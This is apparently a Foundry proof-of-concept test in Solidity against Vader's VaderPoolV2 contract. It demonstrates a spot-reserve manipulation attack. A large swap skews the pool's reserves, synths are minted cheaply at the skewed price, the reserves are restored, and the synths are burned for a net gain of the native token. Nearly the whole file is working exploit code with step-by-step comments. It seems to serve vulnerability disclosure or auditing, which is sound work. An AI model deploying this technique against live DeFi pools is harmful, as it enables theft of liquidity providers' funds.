// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "forge-std/Test.sol";
import "../src/vader/contracts/dex-v2/pool/VaderPoolV2.sol";
import "../src/vader/contracts/dex-v2/synths/SynthFactory.sol";
import "../src/vader/contracts/interfaces/dex-v2/wrapper/ILPWrapper.sol";
import "../src/vader/contracts/interfaces/shared/IERC20Extended.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20, IERC20Extended {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function name() public view override(ERC20, IERC20Extended) returns (string memory) { return super.name(); }
    function symbol() public view override(ERC20, IERC20Extended) returns (string memory) { return super.symbol(); }
    function mint(address to, uint256 amount) external override { _mint(to, amount); }
    function burn(uint256 amount) external override { _burn(msg.sender, amount); }
}

contract MockWrapper is ILPWrapper {
    mapping(IERC20 => IERC20Extended) public override tokens;
    IERC20Extended private immutable lp;
    constructor(IERC20Extended _lp) { lp = _lp; }
    function createWrapper(IERC20 foreignAsset) external override { tokens[foreignAsset] = lp; }
}

contract PoC_42333 is Test {
    MockToken nativeAsset;
    MockToken foreignAsset;
    MockToken lpToken;
    VaderPoolV2 pool;
    IERC20 synth;

    function setUp() public {
        nativeAsset = new MockToken("Vader", "VADER");
        foreignAsset = new MockToken("USD Coin", "USDC");
        lpToken = new MockToken("Vader LP", "VLP");
        pool = new VaderPoolV2(false, nativeAsset);
        MockWrapper wrapper = new MockWrapper(lpToken);
        SynthFactory factory = new SynthFactory(address(pool));
        // The test contract is the configured router solely so it can exercise
        // the source's normal reserve-changing swap entrypoint.
        pool.initialize(wrapper, factory, address(this));
        pool.setTokenSupport(foreignAsset, true);
        pool.setFungibleTokenSupport(foreignAsset);

        nativeAsset.mint(address(this), 1_910 ether);
        foreignAsset.mint(address(this), 10_000 ether);
        nativeAsset.approve(address(pool), type(uint256).max);
        foreignAsset.approve(address(pool), type(uint256).max);
        pool.mintFungible(foreignAsset, 1_000 ether, 1_000 ether, address(this), address(this));
    }

    function test_spot_reserve_manipulation_makes_mint_and_burn_profitable() public {
        uint256 startingNative = nativeAsset.balanceOf(address(this));

        // A flash-loan-sized foreign-asset sale pushes the real pool reserves
        // from 1,000/1,000 to 100/10,000.
        foreignAsset.transfer(address(pool), 9_000 ether);
        pool.swap(foreignAsset, 0, 9_000 ether, address(this));

        // The vulnerable, permissionless mintSynth prices against those spot
        // reserves, so 10 native buys 909 synth units.
        uint256 minted = pool.mintSynth(foreignAsset, 10 ether, address(this), address(this));
        synth = IERC20(address(SynthFactory(address(pool.synthFactory())).synths(foreignAsset)));
        assertGt(minted, 100 ether);

        // Restore the spot reserves in the opposite direction, then redeem the
        // cheaply minted synths using the manipulated redemption price.
        nativeAsset.transfer(address(pool), 90 ether);
        pool.swap(foreignAsset, 90 ether, 0, address(this));
        synth.approve(address(pool), minted);
        pool.burnSynth(foreignAsset, minted, address(this));

        assertGt(nativeAsset.balanceOf(address(this)), startingNative);
    }
}
